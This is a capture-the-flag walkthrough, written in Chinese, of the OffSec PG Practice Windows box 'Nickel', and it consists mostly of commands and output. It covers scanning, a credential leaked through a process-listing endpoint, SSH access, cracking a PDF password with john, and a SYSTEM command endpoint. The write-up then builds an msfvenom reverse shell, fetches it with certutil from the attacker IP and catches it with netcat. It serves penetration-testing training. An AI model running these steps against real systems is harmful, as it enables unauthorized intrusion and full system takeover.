###### tags: `Offsec` `PG Practice` `Intermediate` `Windows`

# Nickel
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.208.99 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.208.99:21
Open 192.168.208.99:22
Open 192.168.208.99:80
Open 192.168.208.99:135
Open 192.168.208.99:139
Open 192.168.208.99:445
Open 192.168.208.99:5040
Open 192.168.208.99:3389
Open 192.168.208.99:7680
Open 192.168.208.99:8089
Open 192.168.208.99:33333
Open 192.168.208.99:49664
Open 192.168.208.99:49665
Open 192.168.208.99:49666
Open 192.168.208.99:49668
Open 192.168.208.99:49667
Open 192.168.208.99:49669

PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           syn-ack OpenSSH for_Windows_8.1 (protocol 2.0)
80/tcp    open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
5040/tcp  open  unknown       syn-ack
7680/tcp  open  pando-pub?    syn-ack
8089/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
33333/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| http-methods: 
|_  Supported Methods: GET POST
|_http-title: Site doesn't have a title.
|_http-favicon: Unknown favicon MD5: 76C5844B4ABE20F72AA23CBE15B2494E
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

查看`http://192.168.208.99:8089/`，有三個
```
List Current Deployments

List Running Processes

List Active Nodes
```

點`List Running Processes`，會導到奇怪的ip，`http://169.254.44.128:33333/list-running-procs?`，把它改回`http://192.168.208.99:33333/list-running-procs`用burpsuite擋下
```
## Request
GET /list-running-procs HTTP/1.1

Host: 192.168.208.99:33333
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1

## Response
<p>Cannot "GET" /list-running-procs</p>
```

改成`POST`
```
## Request 
POST /list-running-procs HTTP/1.1

Host: 192.168.208.99:33333
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1

## Response
<p>HTTP Error 411. The request must be chunked or have a content length.</p>
```

他說需要`content length`，阿不知道為啥我的burp就不能送，改curl，得ssh的`credential`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ curl -X POST -H 'content-length: 1000' http://192.168.208.99:33333/list-running-procs 

...
name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
...
```

還要`base64 decode`，ssh登入，在`C:\Users\ariah\Desktop`得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ echo Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 -d                                   
NowiseSloopTheory139

┌──(kali㉿kali)-[~/pgplay]
└─$ ssh ariah@192.168.208.99 
ariah@192.168.208.99's password: NowiseSloopTheory139

ariah@NICKEL C:\Users\ariah\Desktop>type local.txt
2e5bf15dd929acbbef0addfa74ad5b06
```

在`C:\ftp`裡面有一個`Infrastructure.pdf`，把它傳回來kali
```
ariah@NICKEL C:\ftp>scp Infrastructure.pdf kali@192.168.45.237:/home/kali/Infrastructure.pdf
```

發現他有密碼，用`pdf2john`跟john來crack，得密碼`ariah4168`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ pdf2john Infrastructure.pdf 
Infrastructure.pdf:$pdf$4*4*128*-1060*1*16*14350d814f7c974db9234e3e719e360b*32*6aa1a24681b93038947f76796470dbb100000000000000000000000000000000*32*d9363dc61ac080ac4b9dad4f036888567a2d468a6703faf6216af1eb307921b0

┌──(kali㉿kali)-[~/pgplay]
└─$ john pdf --wordlist=/home/kali/rockyou.txt
ariah4168        (Infrastructure.pdf)
```

Infrastructure.pdf裡面有`Temporary Command endpoint`可以try後面接commands
```
Infrastructure Notes
Temporary Command endpoint: http://nickel/?
Backup system: http://nickel-backup/backup
NAS: http://corp-nas/files

ariah@NICKEL C:\ftp>curl http://127.0.0.1/?whoami
<!doctype html><html><body>dev-api started at 2024-03-23T01:59:57

        <pre>nt authority\system
</pre>
</body></html>
```

看來執行的是Administrator，可以下載reverse讓他反彈，等反彈在`C:\Users\Administrator\Desktop`得proof.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.237 lport=445 -f exe > met_445.exe

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp445

ariah@NICKEL C:\Users\ariah\Desktop>certutil.exe -urlcache -f http://192.168.45.237/met_445.exe met_445.exe

ariah@NICKEL C:\Users\ariah\Desktop>curl http://127.0.0.1/?C:\Users\ariah\Desktop\met_445.exe

C:\Users\Administrator\Desktop>type proof.txt
bd248e05e05a59684344839e3a2b409b
```